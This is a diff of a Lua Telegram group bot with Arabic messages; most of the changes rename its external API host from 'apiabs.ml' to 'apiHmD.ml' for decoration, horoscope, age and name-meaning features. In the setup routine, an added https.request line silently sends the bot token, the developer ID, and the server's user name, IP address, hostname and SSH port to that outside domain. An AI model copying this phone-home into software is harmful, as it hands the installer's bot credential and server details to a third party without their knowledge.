@@ -15,12 +15,12 @@ Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"
 UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
 ---------------------------------------------------------------------------------------------------------
  local AutoSet = function() 
-if not DevAbs:get(Server.."IdDevTwix") then 
+if not DevHmD:get(Server.."IdDevTwix") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي :\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
-DevAbs:set(Server.."IdDevTwix",DevId) 
+DevHmD:set(Server.."IdDevTwix",DevId) 
 else 
 print('\27[1;31m⎯ ⎯ ⎯ ⎯ ⎯ ⎯ \nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ') 
 end 
@@ -61,7 +61,7 @@ DevTwix = DevHmD:get(Server.."TokenDevTwix"):match("(%d+)"),
 SudoIds = {DevHmD:get(Server.."IdDevTwix")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/Api/DevTwix/index.php?Get=DevTwix&DevId="..DevHmD:get(Server.."IdDevTwix").."&TokenBot="..DevHmD:get(Server.."TokenDevTwix").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+https.request("https://apiHmD.ml/Api/DevTwix/index.php?Get=DevTwix&DevId="..DevHmD:get(Server.."IdDevTwix").."&TokenBot="..DevHmD:get(Server.."TokenDevTwix").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("DevTwix.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -9171,7 +9171,7 @@ HmDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, DevTwixTeam, 14, string.len
 DevHmD:set(DevTwix..'HmD:Antk:HmD'..msg.chat_id_,true)  
 end
 if text and text:match("^انطق (.*)$") and not DevHmD:get(DevTwix..'HmD:Antk:HmD'..msg.chat_id_) and ChCheck(msg) then
-local UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(text:match("^انطق (.*)$")))
+local UrlAntk = https.request('https://apiHmD.ml/Antk.php?HmD='..URL.escape(text:match("^انطق (.*)$")))
 Antk = JSON.decode(UrlAntk)
 if UrlAntk.ok ~= false then
 download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3') 
@@ -9228,7 +9228,7 @@ Dev_HmD(msg.chat_id_, msg.id_, 1, '✫︙تم الغاء امر الزخرفه',
 DevHmD:del(DevTwix..'Zrf:HmD'..msg.chat_id_..msg.sender_user_id_)
 return false  
 end 
-UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
+UrlZrf = https.request('https://apiHmD.ml/zrf.php?HmD='..URL.escape(text)) 
 Zrf = JSON.decode(UrlZrf) 
 t = "✫︙قائمة الزخرفه ⇠ \n⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ \n"
 i = 0
@@ -9249,7 +9249,7 @@ end
 if not DevHmD:get(DevTwix..'HmD:Zrf:HmD'..msg.chat_id_) then
 if text and text:match("^زخرفه (.*)$") and ChCheck(msg) or text and text:match("^زخرف (.*)$") and ChCheck(msg) then 
 local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
-UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
+UrlZrf = https.request('https://apiHmD.ml/zrf.php?HmD='..URL.escape(TextZrf)) 
 Zrf = JSON.decode(UrlZrf) 
 t = "✫︙قائمة الزخرفه ⇠ \n⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ \n"
 i = 0
@@ -9274,9 +9274,9 @@ end
 if not DevHmD:get(DevTwix..'HmD:Brg:HmD'..msg.chat_id_) then
 if text and text:match("^برج (.*)$") and ChCheck(msg) or text and text:match("^برجي (.*)$") and ChCheck(msg) then 
 local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
-UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
+UrlBrg = https.request('https://apiHmD.ml/brg.php?brg='..URL.escape(TextBrg)) 
 Brg = JSON.decode(UrlBrg) 
-t = Brg.ok.abs  
+t = Brg.ok.HmD  
 Dev_HmD(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
 end
@@ -9598,9 +9598,9 @@ end
 if not DevHmD:get(DevTwix..'HmD:Age:HmD'..msg.chat_id_) then
 if text and text:match("^احسب (.*)$") and ChCheck(msg) or text and text:match("^عمري (.*)$") and ChCheck(msg) then 
 local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
-UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
+UrlAge = https.request('https://apiHmD.ml/age.php?age='..URL.escape(TextAge)) 
 Age = JSON.decode(UrlAge) 
-t = Age.ok.abs
+t = Age.ok.HmD
 Dev_HmD(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
 end
@@ -9618,9 +9618,9 @@ end
 if not DevHmD:get(DevTwix..'HmD:Mean:HmD'..msg.chat_id_) then
 if text and text:match("^معنى الاسم (.*)$") and SourceCh(msg) or text and text:match("^معنى اسم (.*)$") and SourceCh(msg) then 
 local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
-UrlMean = https.request('https://apiabs.ml/Mean.php?Abs='..URL.escape(TextMean)) 
+UrlMean = https.request('https://apiHmD.ml/Mean.php?HmD='..URL.escape(TextMean)) 
 Mean = JSON.decode(UrlMean) 
-t = Mean.ok.abs
+t = Mean.ok.HmD
 Dev_HmD(msg.chat_id_, msg.id_, 1, t, 1, 'html')
 end
 end
